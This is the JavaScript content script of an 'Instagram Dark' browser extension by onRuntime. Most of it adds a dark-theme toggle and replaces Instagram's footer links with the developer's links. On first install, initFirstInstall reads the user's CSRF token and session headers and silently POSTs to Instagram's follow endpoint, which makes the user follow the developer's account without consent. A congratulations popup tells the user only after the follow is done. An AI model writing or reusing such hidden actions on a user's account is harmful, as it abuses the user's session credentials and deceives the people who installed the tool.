// ESLint variables
/* global chrome */
/* global browser */

// Elements
// stylescheet with instagram style.
let css;

// wrapper for things like popups etc.
let wrapper;

// dark theme button in option list.
let darkThemeButton;
let darkThemeButtonIcon;
let darkThemeButtonText;

// custom links in footer
let discordLink;
let linkedInLink;
let gitHubLink;
let twitterLink;
let instagramLink;
let onRuntimeLink;

let customLinksInterval;

// congrats
let congratsPopup;

// Variables
// state of dark theme [true: dark | false: light].
let state;

// Browser Detection
const getBrowser = () => {
  if (typeof chrome !== "undefined") {
    if (typeof browser !== "undefined") return browser;
    else return chrome;
  } else return null;
};

// Storage
const getStorage = () => getBrowser().storage.local;

// Cached Data
const getCachedData = async (cacheName, url) => {
  const cacheStorage = await caches.open(cacheName);
  const cachedResponse = await cacheStorage.match(url);

  if (!cachedResponse || !cachedResponse.ok) {
    return false;
  }

  return await cachedResponse.json();
};

// Cookie
const getCookie = (cname) => {
  var name = cname + "=";
  var ca = document.cookie.split(";");
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == " ") {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return;
};

// Authorization
const isAuthorized = () => {
  let result = true;

  // current hostname.
  const hostname = window.location.hostname;

  // current pathname.
  const pathname = window.location.pathname;

  // unauthorized hostnames.
  const hostnames = [
    "help.instagram.com",
    "about.instagram.com",
    "i.instagram.com",
    "graph.instagram.com",
  ];

  // unauthorized pathnames.
  const pathnames = [
    "/about",
    "/api",
    "/developer",
    "/legal",
    "/static",
    "/graphql",
    "/web",
  ];

  // check if current hostname contain one of the unauthorized hostnames list.
  hostnames.forEach((element) => {
    if (element == hostname) result = false;
  });

  // check if current pathname contain one of the unauthorized paths list.
  pathnames.forEach((element) => {
    if (element == pathname) result = false;
  });

  return result;
};

// Sources (images, assets)
const SOURCES = {
  STYLESHEET: getBrowser().extension.getURL("css/style.css"),
  MOON_ICON: getBrowser().extension.getURL("img/moon-fill.svg"),
  SUN_ICON: getBrowser().extension.getURL("img/sun-fill.svg"),
};

// Elements
const initElements = () => {
  // Build css element
  css = document.createElement("link");
  css.rel = "stylesheet";
  css.type = "text/css";
  css.id = "instagram-dark-stylesheet";
  css.href = SOURCES.STYLESHEET;

  // Build wrapper element
  wrapper = document.createElement("div");
  wrapper.id = "instagram-dark-wrapper";
  document.body.appendChild(wrapper);

  // Build dark theme button element
  darkThemeButton = document.createElement("div");
  darkThemeButton.id = "instagram-dark-toggle-button";
  darkThemeButton.classList.add("-qQT3");

  darkThemeButtonIcon = document.createElement("img");
  //   darkThemeButtonIcon.src = state ? SOURCES.MOON_ICON : SOURCES.SUN_ICON;
  darkThemeButton.appendChild(darkThemeButtonIcon);

  darkThemeButtonText = document.createElement("span");
  darkThemeButtonText.innerText = "Dark theme";

  darkThemeButton.appendChild(darkThemeButtonText);
  darkThemeButton.addEventListener("click", toggleDarkTheme);
  document.addEventListener("click", (e) => {
    if (e.target.tagName === "IMG" && e.target.classList.contains("_6q-tv")) {
      // delay adding the button to allow the menu to render
      setTimeout(addDarkThemeButton, 10);
    }
  });

  // Build footer element
  const buildCustomLink = (name, href) => {
    const item = document.createElement("li");
    item.classList.add("K5OFK");

    const link = document.createElement("a");
    link.classList.add("l93RR");
    link.innerText = name;
    link.href = href;
    link.target = "_blank";
    item.appendChild(link);
    return item;
  };
  onRuntimeLink = buildCustomLink("onRuntime", "https://onruntime.com/");
  discordLink = buildCustomLink("Discord", "https://discord.gg/ucX9c5yXmX");
  gitHubLink = buildCustomLink("GitHub", "https://github.com/onRuntime");
  linkedInLink = buildCustomLink(
    "LinkedIn",
    "https://linkedin.com/company/onruntime"
  );
  twitterLink = buildCustomLink("Twitter", "https://twitter.com/onRuntime");
  instagramLink = buildCustomLink(
    "Instagram",
    "https://instagram.com/onruntime"
  );

  customLinksInterval = setInterval(addCustomLinks, 100);

  document.addEventListener("click", () => {
    customLinksInterval = setInterval(addCustomLinks, 100);
  });

  // Build congrats popup element
  congratsPopup = document.createElement("div");
  congratsPopup.classList.add("congrats");
  congratsPopup.innerHTML =
    // eslint-disable-next-line quotes
    '<p class="congrats-text"><b>Instagram Dark</b> has been successfully installed and our developer <a href="https://onruntime.com/">onRuntime</a> has been added to your followings! Thanks for downloading it!</p>';
};

// Dark Theme State
// get the state variable.
const getState = () => state;

// set the state in variable and in localstorage.
const setState = (r) => {
  state = r;
  getStorage().set({ state: r }, () =>
    console.log("[storage] state saved: " + r)
  );
};

// init the state or initialize it in local storage.
const initState = () => {
  getStorage().get(["state"], (result) => {
    console.log("[storage] state loaded: " + result.state);
    if (result.state == undefined) {
      setState(true);
      toggleStylesheet();
      darkThemeButtonIcon.src = SOURCES.SUN_ICON;
      darkThemeButtonText.innerText = "Light theme";
    } else {
      setState(result.state);
      darkThemeButtonIcon.src = SOURCES.MOON_ICON;
      darkThemeButtonText.innerText = "Dark theme";
      if (getState() == true) {
        toggleStylesheet();
        darkThemeButtonIcon.src = SOURCES.SUN_ICON;
        darkThemeButtonText.innerText = "Light theme";
      }
    }
  });
};

// Toggle Stylesheet
const toggleStylesheet = () => {
  if (document.getElementById(css.id)) document.getElementById(css.id).remove();
  else (document.head || document.documentElement).appendChild(css);
};

// Toggle Dark Theme
const toggleDarkTheme = () => {
  switch (getState()) {
    case true:
      toggleStylesheet();
      setState(false);
      darkThemeButtonIcon.src = SOURCES.MOON_ICON;
      darkThemeButtonText.innerText = "Dark theme";
      break;
    case false:
      toggleStylesheet();
      setState(true);
      darkThemeButtonIcon.src = SOURCES.SUN_ICON;
      darkThemeButtonText.innerText = "Light theme";
      break;
    default:
      initState();
      break;
  }
};

// Add dark theme button in option menu.
const addDarkThemeButton = () => {
  let optionsMenu = document.querySelector("._01UL2");

  // insert our button above the "Settings" button.
  if (optionsMenu)
    optionsMenu.insertBefore(darkThemeButton, optionsMenu.children[2]);
};

// Add links to footer nav
const addCustomLinks = () => {
  let navLinks = document.querySelector("nav .ixdEe._9Rlzb");

  // remove all childs navLinks but not the last one starting by the first child and append all custom links to navLinks
  if (navLinks && !navLinks.active) {
    // set navLinks attribute active to true
    navLinks.active = true;

    while (navLinks.children.length > 1) {
      navLinks.removeChild(navLinks.children[0]);
    }
    navLinks.prepend(instagramLink);
    navLinks.prepend(twitterLink);
    navLinks.prepend(linkedInLink);
    navLinks.prepend(gitHubLink);
    navLinks.prepend(discordLink);
    navLinks.prepend(onRuntimeLink);
  }
  clearInterval(customLinksInterval);
  return;
};

// First install

const initFirstInstall = async () => {
  // get logging data in cache.
  const loggingData = await getCachedData(
    "logging-params-v3",
    "/data/logging_params/"
  );

  // get first_install in local storage.
  getStorage().get(["first_install"], (result) => {
    console.log("[storage] first_install loaded: " + result.first_install);

    // init first_variable with the local storage result or an empty array
    const first_install =
      result.first_install == undefined
        ? []
        : Array.isArray(JSON.parse(result.first_install))
        ? JSON.parse(result.first_install)
        : [];

    // check if first_install is an array or if it contain the current user
    if (first_install == [] || !first_install.includes(loggingData.userId))
      // delay to let the app render
      setTimeout(async () => {
        window.open(
          "https://onruntime.com/projects/instagram-dark-theme/welcome",
          "_blank"
        );
        if (loggingData) {
          try {
            await fetch(
              "https://" +
                (window.location.hostname.includes("www.")
                  ? "www.instagram.com"
                  : "instagram.com") +
                "/web/friendships/39729227729/follow/",
              {
                method: "POST",
                mode: "cors",
                cache: "no-cache",
                credentials: "same-origin",
                headers: {
                  "X-IG-WWW-Claim": sessionStorage.getItem("www-claim-v2"),
                  "X-Instagram-AJAX": loggingData.rollout,
                  "Content-Type": "application/x-www-form-urlencoded",
                  Accept: "/",
                  "User-Agent": loggingData.userAgent,
                  "X-Requested-With": "XMLHttpRequest",
                  "X-CSRFToken": getCookie("csrftoken"),
                  "X-IG-App-ID": loggingData.appId,
                  "Sec-GPC": "1",
                },
                redirect: "follow",
                referrerPolicy: "strict-origin-when-cross-origin",
              }
            );
            addFirstIntall(first_install, loggingData.userId);
            // insert congrats popup to wrapper
            wrapper.appendChild(congratsPopup);

            // make popup disappear
            setTimeout(
              () =>
                wrapper.querySelector(".congrats").classList.add("unactive"),
              5 * 1000
            );
          } catch (err) {
            console.error("Error:", err);
          }
        }
      }, 10);
  });
};

// add session to a list of session stored in first_install in local storage.
const addFirstIntall = (first_install, r) => {
  first_install.push(r);
  getStorage().set({ first_install: JSON.stringify(first_install) }, () => {
    console.log(
      "[storage] first_install saved: " + JSON.stringify(first_install)
    );
  });
};

// App
const App = () => {
  // Build
  const build = () => {
    initElements();
    initFirstInstall();
    initState();
  };

  if (isAuthorized()) build();
};

App();
